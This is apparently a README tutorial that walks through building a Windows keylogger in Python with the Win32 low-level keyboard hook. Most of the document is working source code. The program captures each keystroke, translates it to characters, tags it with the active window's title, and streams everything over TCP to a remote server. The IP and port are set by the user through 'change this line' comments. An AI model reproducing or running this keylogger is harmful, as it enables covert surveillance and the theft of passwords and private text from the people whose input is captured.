# Keylogger with Python and Win32 API  

A keylogger captures keyboard input by setting up a low-level keyboard hook using the Windows API. This project demonstrates how to implement a keylogger in Python, sending the logged keys to a remote server.  

## References  

- [Hooks - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/winmsg/hooks)  
- [GetWindowTextA - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowtexta)  
- [GetWindowTextLengthA - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowtextlengtha)  
- [GetKeyState - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate)  
- [GetKeyboardState - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardstate)  
- [ToAscii - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-toascii)  
- [CallNextHookEx - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex)  
- [SetWindowsHookExA - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)  
- [GetMessageA - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessagea)  
- [HOOKPROC - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nc-winuser-hookproc)  
- [KBDLLHOOKSTRUCT - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct)  
- [GetForegroundWindow - Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getforegroundwindow)  
- [ctypes CFUNCTYPE - Python Documentation](https://docs.python.org/3/library/ctypes.html#ctypes.CFUNCTYPE)  


## Overview of Hooks  

Per microsoft:  

_A point in the system message-handling mechanism where an application can install a subroutine to monitor the message traffic in the system and process certain types of messages before they reach the target window procedure._

This program leverages the `WH_KEYBOARD_LL` hook type to monitor low-level keyboard input events.  


## Building the script

__Imports and Constants__

The script begins by importing the necessary modules and defining constants related to the Windows API.  

```python
import sys
import socket
from ctypes import *
from ctypes import wintypes
```

The constants and types include:  

- **`WH_KEYBOARD_LL`**: Installs a hook procedure to monitor low-level keyboard events.  
- **`WM_KEYDOWN`**: Indicates a key has been pressed.  
- **`HOOKPROC`**: Defines the callback function type used with hooks.  
- **`WM_RETURN`**: Represents the Enter/Return key on the keyboard.  
- **`WM_SHIFT`**: Represents the Shift key, used to modify key inputs such as uppercase letters or symbols.  
- **`lpKeyState`**: The 256-byte array that receives the status data for each virtual key.


```python
user32 = windll.user32
lpKeyState = wintypes.BYTE * 256

IP_ADDR = "127.0.0.1"  # change this line
PORT = 9001            # change this line.

LRESULT = c_long
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10

HOOKPROC = CFUNCTYPE(
    LRESULT,
    wintypes.INT,
    wintypes.WPARAM,
    wintypes.LPARAM
)
```

__Windows API Function Definitions__

To interact with the Windows API, the script declares and configures API functions such as `GetWindowTextA`, `CallNextHookEx`, and `GetMessageA`. Each function's argument types and return types are explicitly specified using `ctypes` for type safety and correct behavior.

```python
GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = (
    wintypes.HANDLE,
    wintypes.LPSTR,
    wintypes.INT
)
GetWindowTextA.restype = wintypes.INT

# [...]
```

Similarly, other functions such as `GetForegroundWindow`, `SetWindowsHookExA`, `GetKeyState`, and `ToAscii` are also defined.  

__Low-Level Hook Structure__

The `KBDLLHOOKSTRUCT` structure stores information about a low-level keyboard input event, such as the virtual key code, scan code, and additional flags. This structure is populated for each intercepted keyboard event.  

```python
class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", wintypes.DWORD)
    ]
```
__Get Foreground Process__

The `get_fgproc` function identifies the title of the currently active window, allowing us to associate logged keystrokes with the application in focus. It uses `GetForegroundWindow` to obtain a handle to the focused window, determines the title length using `GetWindowTextLengthA`, and retrieves the title with `GetWindowTextA`. The resulting string represents the window's title, which can be logged alongside captured keystrokes for context.

```python
def get_fgproc():
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthA(hwnd)
    buf = create_string_buffer(length + 1)
    user32.GetWindowTextA(hwnd, buf, length + 1)
    return buf.value
```

__Hook Callback Function__

The `hook_func` function is the core of the keylogger, processing each keyboard event. It checks for changes in the active window using `get_fgproc`. When a new window is detected, the function logs its title. The `last` variable tracks the previously active window, ensuring only new titles are sent to the server.

By interacting with the `lParam` parameter, the function identifies the key pressed and passes the event to the next hook in the chain using `CallNextHookEx`.

```python
def hook_func(nCode, wParam, lParam):
    global last
    if last != get_fgproc():
        last = get_fgproc()
        msg = "\n[!] Last foreground process -> {}\n".format(last.decode("latin-1"))
        s.send(msg.encode("latin-1"))
```

__Capturing and Logging Keystrokes__

Within `hook_func`, key presses are captured using the `KBDLLHOOKSTRUCT` structure. The key's virtual code and state are processed to determine the corresponding character using `ToAscii`. This function translates virtual key codes into ASCII characters, respecting the current keyboard layout and state.  


```python
    if wParam == WM_KEYDOWN:                             # Check if the event is a key press
        keyboard = KBDLLHOOKSTRUCT.from_address(lParam)  # Parse key details from lParam
        state = (wintypes.BYTE * 256)()                  # Create a buffer for the keyboard state
        user32.GetKeyboardState(byref(state))            # Retrieve the current keyboard state
        buf = (c_ushort * 1)()                           # Buffer for the resulting character
        n = user32.ToAscii(                              # Convert virtual key to ASCII
            keyboard.vkCode,
            keyboard.scanCode,
            state,
            buf,
            0
        )

        if n > 0:                             # Check if a character was successfully converted
            if keyboard.vkCode == WM_RETURN:  # Handle the Enter key
                s.send(b"\n")
            else:
                msg = "{}".format(string_at(buf).decode("latin-1"))  # Decode the character
                s.send(msg.encode("latin-1"))                        # Send the character to the server

    return user32.CallNextHookEx(  # Pass the event to the next hook
        hook,
        nCode,
        wParam,
        lParam
    )
```


__Main Function__

The main function initializes the keylogger. It establishes a TCP connection with the server, setting up a socket for communication. Using the `SetWindowsHookExA` function, it installs a low-level keyboard hook (`WH_KEYBOARD_LL`) that invokes `hook_func` on each keyboard event. Finally, `GetMessageA` enters a message loop to process events until the program is terminated.

```python
if __name__ == "__main__":
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
        s.connect((IP_ADDR, PORT))                             # Connect to the remote server

        last = None                     # Track the last active window
        callback = HOOKPROC(hook_func)  # Define the hook callback

        hook = user32.SetWindowsHookExA(  # Install the keyboard hook
            WH_KEYBOARD_LL,
            callback,
            0,
            0
        )

        user32.GetMessageA(  # Enter the event processing loop
            byref(wintypes.MSG()),
            0,
            0,
            0
        )
    except:
        sys.exit(1)  # Exit on error
```

## Example Output

![demo](https://github.com/user-attachments/assets/bbdd1602-330d-484c-88cf-610a41189ccb)

